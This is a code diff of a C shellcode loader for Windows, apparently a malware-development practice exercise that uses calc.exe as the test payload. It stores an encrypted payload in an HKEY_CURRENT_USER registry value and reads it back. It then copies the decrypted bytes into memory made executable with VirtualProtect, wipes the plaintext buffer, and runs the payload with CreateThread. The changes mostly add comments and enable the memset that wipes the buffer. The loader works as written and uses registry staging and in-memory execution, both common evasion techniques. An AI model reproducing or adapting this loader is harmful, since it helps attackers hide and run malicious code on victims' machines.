@@ -52,12 +52,14 @@ BOOL WriteShellcode(IN PBYTE pShellcode, IN DWORD sSizeShellcode) {
 
     printf("[*] Writing Registry.....\n\n");
 
+    // Retrieve Handle to Registry
 	STATUS = RegOpenKeyExA(HKEY_CURRENT_USER, REGISTRY, 0, KEY_SET_VALUE, &hKey);
 	if (ERROR_SUCCESS != STATUS) {
 		printf("Error RegOpenKeyExA with: %d", GetLastError());
 		bState = FALSE; goto _EndOfFunctions;
 	}
 
+    // Write Shellcode Encrypted on REGSTRING
 	STATUS = RegSetValueExA(hKey, REGSTRING, 0, REG_BINARY, pShellcode, sSizeShellcode);
 	if (ERROR_SUCCESS != STATUS) {
 		printf("Error RegSetValueExA with: %d", GetLastError());
@@ -81,18 +83,21 @@ BOOL ReadShellcodeFromRegistry(OUT PBYTE* pPayload, OUT SIZE_T* sPayload) {
 
     printf("[*] Reading Shellcode from Registry...\n\n");
 
+    // Retrieve Size of Shellcode
     STATUS = RegGetValueA(HKEY_CURRENT_USER, REGISTRY, REGSTRING, RRF_RT_ANY, NULL, NULL, &dwBytesRead);
     if (ERROR_SUCCESS != STATUS) {
         printf("Error RegGetValueA: %d", GetLastError());
         return FALSE;
     }
 
+    // Allocate memory for bytes of shellcode
     pBytes = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwBytesRead);
     if (pBytes == NULL) {
         printf("Error Allocating Memory HeapAlloc: %d", GetLastError());
         return FALSE;
     }
 
+    // Read Shellcode Encrypted from registry
     STATUS = RegGetValueA(HKEY_CURRENT_USER, REGISTRY, REGSTRING, RRF_RT_ANY, NULL, pBytes, &dwBytesRead);
     if (ERROR_SUCCESS != STATUS) {
         printf("Error Second RegGetValueA with: %d", GetLastError());
@@ -138,18 +143,20 @@ BOOL ExecutePayload(IN PVOID pDecryptShellcode, IN SIZE_T sDecryptedShellcodeSiz
     PVOID pShellcodeAddress = NULL;
     DWORD dwOldProtection = NULL;
 
+    // Allocate Memory to Shellcode Desencrypted
     pShellcodeAddress = VirtualAlloc(NULL, sDecryptedShellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     if (pShellcodeAddress == NULL) {
         printf("Error VirtualAlloc: %d", GetLastError());
         return FALSE;
     }
 
-
+    // Copy Shellcode Desencrypted into memory
     memcpy(pShellcodeAddress, pDecryptShellcode, sDecryptedShellcodeSize);
-    //memset(pDecryptShellcode, '\0', sDecryptedShellcodeSize);
+    memset(pDecryptShellcode, '\0', sDecryptedShellcodeSize);
 
     printf("Allocated Payload at: 0x%p \n", pShellcodeAddress);
 
+    // Change Memory Protection to EXECUTE_READWRITE
     if (!VirtualProtect(pShellcodeAddress, sDecryptedShellcodeSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
         printf("Error Virtual Protect: %d", GetLastError());
         return FALSE;
@@ -159,6 +166,7 @@ BOOL ExecutePayload(IN PVOID pDecryptShellcode, IN SIZE_T sDecryptedShellcodeSiz
     printf("Press Enter To Run...\n");
     getchar();
 
+    // CreateThread for executed Shellcode (cacl.exe)
     if (CreateThread(NULL, NULL, pShellcodeAddress, NULL, NULL, NULL) == NULL) {
         printf("Error Failed CreateThread: %d", GetLastError());
         return FALSE;
